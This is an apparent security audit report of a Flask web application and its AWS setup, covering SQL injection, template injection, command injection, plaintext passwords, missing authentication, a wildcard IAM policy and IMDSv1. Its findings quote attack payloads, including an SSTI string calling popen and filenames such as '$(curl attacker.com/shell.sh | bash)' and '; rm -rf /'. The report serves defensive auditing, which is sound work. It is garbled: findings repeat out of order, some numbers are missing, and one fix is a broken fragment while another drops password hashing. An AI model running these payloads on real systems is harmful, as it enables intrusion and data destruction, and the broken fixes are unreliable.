# Security Audit Report

## Critical Vulnerabilities

---

### 1. SQL Injection
**File:** `./app/routes/auth.py` — `login()` function
**Severity:** Critical

```python
# VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
result = db.session.execute(query)
```

Raw string concatenation allows an attacker to manipulate the query entirely. For example, a username of `' OR '1'='1' --` would bypass authentication.

**Fix:** Use parameterised queries or the ORM:
```python
# Option 1: ORM (preferred)
user = User.query.filter_by(username=username, password=hashed_password).first()

# Option 2: Parameterised query
query = text("SELECT * FROM users WHERE username = :username AND password = :password")
result = db.session.execute(query, {"username": username, "password": hashed_password})
```

---

### 2. Server-Side Template Injection (SSTI)
**File:** `./app/routes/templates.py` — `render_template_custom()`
**Severity:** Critical

```python
# VULNERABLE — unsandboxed Jinja2 environment with user input
env = Environment()
template = env.from_string(template_str)  # template_str is raw user input
rendered = template.render(**context)
```

An attacker can execute arbitrary code on the server. A payload such as:
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Fix:** Use Jinja2's `SandboxedEnvironment` and strictly validate/whitelist inputs:
```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(template_str)
rendered = template.render(**context)
```
Ideally, avoid rendering arbitrary user-supplied templates entirely.

---

### 3. OS Command Injection
**File:** `./app/routes/files.py` — `process_file()`
**Severity:** Critical

```python
# VULNERABLE — shell=True with unsanitised user input
result = subprocess.run(
    "file " + filename,   # filename is raw user input
    shell=True,
    capture_output=True,
    text=True
)
```

A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` executes arbitrary commands.

**Fix:** Never use `shell=True` with user input. Pass arguments as a list:
```python
import shlex

# Validate filename first
if not re.match(r'^[\w\-. ]+$', filename):
    return jsonify({"error": "Invalid filename"}), 400

result = subprocess.run(
    ["file", filename],   # list form, no shell interpolation
    shell=False,
    capture_output=True,
    text=True
)
```

### 4. Plaintext Password Storage
**File:** `./app/routes/auth.py` — `register()`
**Severity:** Critical

```python
# VULNERABLE — password stored as plaintext
user = User(username=username, password=password, email=email)
```

If the database is compromised, all user passwords are immediately exposed.

**Fix:** Hash passwords with `bcrypt` or `werkzeug.security`:
```python
from werkzeug.security import generate_password_hash, check_password_hash

# On registration
user = User(username=username, password=generate_password_hash(password), email=email)

# On login (ORM approach)
user = User.query.filter_by(username=username).first()
if user and check_password_hash(user.password, password):
    token = generate_token(user.id)
```

### 6. No Authentication or Authorisation on Any Route
**Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
**Severity:** High

Every endpoint — including user deletion, file processing, and template rendering — is completely unauthenticated. Any anonymous request can:
- List all users and their emails (`GET /users/`)
- Delete any user (`DELETE /users/delete/<username>`)
- Delete any file (`DELETE /files/delete/<id>`)
- Execute server-side templates (see SSTI above)

**Fix:** Implement a JWT verification decorator and apply it to protected routes:
```python
from functools import wraps
from flask import request, jsonify
import jwt

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization", "").removeprefix("Bearer ")
        if not token:
            return jsonify({"error": "Missing token"}), 401
        try:
            payload = jwt.decode(token, os.environ["JWT_SECRET"], algorithms=["HS256"])
            request.user_id = payload["user_id"]
        except jwt.ExpiredSignatureError:
            return jsonify({"error": "Token expired"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"error": "Invalid token"}), 401
        return f(*args, **kwargs)
    return decorated

# Apply to routes
@users_bp.route("/delete/<username>", methods=["DELETE"])
@require_auth
def delete_user(username):
    ...
```

### 7. Overly Permissive IAM Policy — Wildcard Administrator Access
**File:** `./infrastructure/iam-policy.json`
**Severity:** High

```json
{
    "Sid": "AdministratorAccess",
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
}
```

This grants full administrator access to every AWS service and resource. The subsequent, more specific statements are entirely redundant. A compromised identity with this policy can exfiltrate data, destroy infrastructure, create backdoor accounts, etc.

**Fix:** Apply the principle of least privilege. Grant only the specific actions and resources the application actually needs:
```json
{
    "Sid": "AppSpecificAccess",
    "Effect": "Allow",
    "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:ListBucket"
    ],
    "Resource": [
        "arn:aws:s3:::dissertation-bucket",
        "arn:aws:s3:::dissertation-bucket/*"
    ]
}
```

### 8. Debug Mode Enabled in Production Entry Point
**File:** `./run.py`
**Severity:** High

```python
app.run(debug=True)
```

Flask's debug mode enables the interactive Werkzeug debugger, which allows **arbitrary Python code execution** in the browser if an exception occurs. It also enables auto-reloading and exposes detailed stack traces.

**Fix:**
```python
if __name__ == "__main__":
    debug = os.environ.get("FLASK_ENV") == "development"
    app.run(debug=debug)
```
In production, use a proper WSGI server (e.g., Gunicorn) and never set `debug=True`.

### 9. EC2 Instance Metadata Service (IMDSv1) Enabled
**File:** `./infrastructure/main.tf`
**Severity:** High

```hcl
metadata_options {
    http_tokens = "optional"   # IMDSv1 allowed
}
```

IMDSv1 is unauthenticated. Any SSRF vulnerability in the application can be used to query `http://169.254.169.254/` and steal IAM credentials attached to the instance role.

**Fix:** Enforce IMDSv2 (token-required):
```hcl
metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"   # IMDSv2 only
    http_put_response_hop_limit = 1
}
```

### 13. No Input Validation on File Upload
**File:** `./app/routes/files.py` — `upload_file()`
**Severity:** Medium

```python
filename = data.get("filename")
file_record = File(filename=filename, uploaded_by=uploaded_by)
```

No validation is performed on `filename`. This enables path traversal strings (`../../etc/passwd`) to be stored in the database and later used in the command injection sink in `process_file()`.

**Fix:**
```python
import re
from pathlib import Path

filename = data.get("filename", "")
# Reject path traversal and shell metacharacters
if not re.match(r'^[\w\-. ]+$', filename) or Path(filename).name != filename:
    return jsonify({"error": "Invalid filename"}), 400
```

### 14. Missing Input Validation on Auth Endpoints
**File:** `./app/routes/auth.py` — `register()`
**Severity:** Medium

```python
data = request.get_json()
username = data.get("username")
password = data.get("password")
email = data.get("email")
# No null checks, no length limits, no format validation
user = User(username=username, password=password, email=email)
```

Missing validation allows null values, excessively long strings (potential DoS), and malformed emails to be inserted into the database.

**Fix:**
```python
if not username or not password or not email:
    return jsonify({"error": "All fields are required"}), 400
if len(username) > 80 or len(password) > 128:
    return jsonify({"error": "Input too long"}), 400
if not re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
    return jsonify({"error": "Invalid email"}), 400
```

### 15. JWT Algorithm Not Validated on Decode
**File:** `./app/routes/auth.py`
**Severity:** Low

The `generate_token` function specifies `HS256`, but there is no corresponding `decode` call in the codebase that enforces the algorithm. If a decode is added later without specifying `algorithms=["HS256"]`, it may be vulnerable to the `alg: none` attack.

**Fix:** Always explicitly specify allowed algorithms when decoding:
```python
jwt.decode(token, secret, algorithms=["HS256"])
```

### 1. SQL Injection
**File:** `./app/routes/auth.py` — `login()` function
**Severity:** Critical

```python
# VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
result = db.session.execute(query)
```

Raw string concatenation allows an attacker to manipulate the query entirely. For example, a username of `' OR '1'='1' --` would bypass authentication.

**Fix:** Use parameterised queries:
```python
from sqlalchemy import text

user = User.query.filter_by(username=username, password=password).first()
# OR with raw SQL:
result = db.session.execute(
    text("SELECT * FROM users WHERE username = :username AND password = :password"),
    {"username": username, "password": password}
)
```

### 2. Server-Side Template Injection (SSTI)
**File:** `./app/routes/templates.py` — `render_template_custom()`
**Severity:** Critical

```python
# VULNERABLE
env = Environment()
template = env.from_string(template_str)  # User-controlled input
rendered = template.render(**context)
```

An attacker can execute arbitrary code on the server. For example, submitting:
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Fix:** Never render user-supplied strings as Jinja2 templates. If templating is required, use a strict sandbox and whitelist approach:
```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()  # Restricts access to dangerous attributes
# Additionally, validate/whitelist allowed template constructs
```
Ideally, avoid this pattern entirely and use predefined templates with user-supplied data only as context variables.

### 3. OS Command Injection
**File:** `./app/routes/files.py` — `process_file()`
**Severity:** Critical

```python

result = subprocess.run(
    "file " + filename,  # User-controlled
    shell=True,          # Shell interpretation enabled
    capture_output=True,
    text=True
)
```

`shell=True` with unsanitised input allows arbitrary command execution. A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` would be executed by the shell.

```python
    capture_output=True,
    text=True
)
```

### 7. Missing Authentication on All Endpoints
**Files:** `./app/routes/users.py`, `./app/routes/files.py`
**Severity:** High

```python
# No authentication decorator on any route
@users_bp.route("/delete/<username>", methods=["DELETE"])
def delete_user(username):
    ...  # Anyone can delete any user

@files_bp.route("/delete/<int:file_id>", methods=["DELETE"])
def delete_file(file_id):
    ...  # Anyone can delete any file
```

All endpoints are publicly accessible with no authentication or authorisation checks.

**Fix:** Implement a JWT verification decorator and apply it to protected routes:
```python
from functools import wraps
import jwt
from flask import request, jsonify

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization", "").replace("Bearer ", "")
        if not token:
            return jsonify({"error": "Unauthorised"}), 401
        try:
            payload = jwt.decode(token, os.environ.get("JWT_SECRET_KEY"), algorithms=["HS256"])
            request.user_id = payload["user_id"]
        except jwt.ExpiredSignatureError:
            return jsonify({"error": "Token expired"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"error": "Invalid token"}), 401
        return f(*args, **kwargs)
    return decorated

@users_bp.route("/delete/<username>", methods=["DELETE"])
@require_auth
def delete_user(username):
    ...
```

### 8. IMDS v1 Enabled on EC2 Instance (SSRF Risk)
**File:** `./infrastructure/main.tf`
**Severity:** High

```hcl
metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"  # Allows IMDSv1
    http_put_response_hop_limit = 1
}
```

`http_tokens = "optional"` permits IMDSv1, which does not require a session token. If the application is vulnerable to SSRF, an attacker can reach `http://169.254.169.254/` and retrieve IAM credentials without any additional authentication step.

**Fix:** Enforce IMDSv2:
```hcl

    http_endpoint               = "enabled"
    http_tokens                 = "required"  # IMDSv2 only
    http_put_response_hop_limit = 1
}
```
